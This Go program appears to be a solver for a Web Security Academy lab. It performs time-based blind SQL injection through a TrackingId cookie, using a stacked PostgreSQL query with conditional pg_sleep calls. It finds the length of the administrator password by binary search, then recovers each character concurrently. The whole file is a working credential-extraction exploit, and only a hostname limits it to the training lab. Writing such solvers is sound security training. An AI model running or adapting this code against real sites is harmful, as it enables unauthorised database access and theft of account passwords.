package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"
)

type Range struct { Min int; Max int }

type CharState struct {
	Index int
	Current int
	Min int
	Max int
	Complete bool
}

const Width = 20
// Define ANSI colors
const (R = "\x1b[31m"; G = "\x1b[32m"; Y = "\x1b[33m"; RST = "\x1b[0m")

var (
	LabId string
	LabHost string
	LabUrl *url.URL
	LabUrlString string
	Client *http.Client
)

func main() {
	if len(os.Args) <= 1 {
		panic("Lab ID not specified.")
	}

	LabId = os.Args[1]
	LabHost = fmt.Sprintf("%s.web-security-academy.net", LabId)
	LabUrl, _ = url.Parse(fmt.Sprintf("https://%s/", LabHost))
	LabUrlString = LabUrl.String()

	fmt.Printf("%*s :: %s%s%s\n", Width, "Lab ID", G, LabId, RST)

	Client = &http.Client{
		Transport: &http.Transport{
			MaxIdleConns: 100,
			MaxIdleConnsPerHost: 100,
		},
	}

	// Check the lab status
	fmt.Printf("%*s :: ", Width, "Lab status")

	res, err := Client.Get(LabUrlString)
	if err != nil { log.Fatal(err) }
	res.Body.Close()

	statusColor := G
	if res.StatusCode != 200 { statusColor = R }
	fmt.Printf("%s%s%s\n", statusColor, res.Status, RST)
	if res.StatusCode != 200 { os.Exit(1) }

	// Determine password length
	passwordLength := findPasswordLength()
	fmt.Printf("\r%*s :: %s%d%s      \n", Width, "Password length", G, passwordLength, RST)

	// Solve each character concurrently

	states := make([]*CharState, 0)
	updates := make(chan CharState)
	
	for i := 0; i < passwordLength; i++ {
		states = append(states, &CharState{
			Index: i,
			Current: '-',
			Min: 0x20,
			Max: 0x7E,
		})
	}

	printPassword(states)

	semaphoreChan := make(chan struct{}, 1)
	defer close(semaphoreChan)

	for _, state := range states {
		go binarySearchState(*state, updates, semaphoreChan)
	}

	for s := range updates {
		states[s.Index].Complete = s.Complete
		states[s.Index].Current = s.Current
		printPassword(states)
		complete := true
		for _, s := range states {
			if !s.Complete {
				complete = false
				break
			}
		}
		if complete { break }
	}
	
	fmt.Println()
}

func execCondition(client *http.Client, condition string) (result bool, err error) {
	
	const Delay = 4

	req, err := http.NewRequest("GET", LabUrlString, http.NoBody)
	if err != nil { return }

	req.Header.Set("Cookie", fmt.Sprintf(
		`TrackingId='%%3b` +
		`SELECT CASE WHEN(%s) THEN pg_sleep(0) ELSE pg_sleep(%d) END FROM users WHERE username = 'administrator`,
		condition, Delay,
	))

	start := time.Now()
	res, err := client.Do(req)
	elapsed := time.Now().Sub(start)
	result = elapsed < (time.Second * (Delay - 1))

	if err != nil { return }
	io.Copy(io.Discard, res.Body)
	res.Body.Close()

	if res.StatusCode != 200 {
		panic(fmt.Errorf("invalid status: %v", res.Status))
	}
	return
}

func findPasswordLength() int {
	min, max := 1, 0
	for max == 0 || min < max {
		mid := 0
		if max > 0 {
			mid = min + (max - min) / 2
		} else {
			mid = min * 2
		}

		fmt.Printf("\r%*s :: %s", Width, "Password length", Y)
		if min != 0 { fmt.Print(min) }
		fmt.Print("~")
		if max != 0 { fmt.Print(max) }
		fmt.Print(RST)

		result, err := execCondition(Client, fmt.Sprintf("LENGTH(password) > %d", mid))
		if err != nil { log.Fatal(err) }

		if result {
			min = mid + 1
		} else {
			max = mid
		}
	}
	return min
}

func printPassword(states []*CharState) {
	fmt.Printf("\r%*s :: ", Width, "Password")
	for _, state := range states {
		color := Y
		if state.Complete {
			color = G
		}
		fmt.Printf("%s%c%s", color, state.Current, RST)
	}
}

func binarySearchState(state CharState, update chan<- CharState, sema chan struct{}) {
	for !state.Complete {
		mid := 0
		if state.Max > 0 {
			mid = state.Min + (state.Max - state.Min) / 2
		} else {
			mid = state.Min * 2
		}

		var result bool
		var err error
		attempts := 0
		for ; attempts < 3; attempts++ {
			sema <- struct{}{}
			result, err = execCondition(Client, fmt.Sprintf("ASCII(SUBSTR(password, %d, 1)) > %d", state.Index+1, mid))
			<-sema
			if err != nil {
				if attempts == 2 {
					panic(err)
				}
			} else {
				break
			}
		}

		if result {
			state.Min = mid + 1
		} else {
			state.Max = mid
		}

		if state.Max > 0 {
			mid = state.Min + (state.Max - state.Min) / 2
		} else {
			mid = state.Min * 2
		}
		state.Current = mid
		state.Complete = state.Min >= state.Max
		if state.Complete {
			state.Current = state.Min
		}

		update <- state
	}
}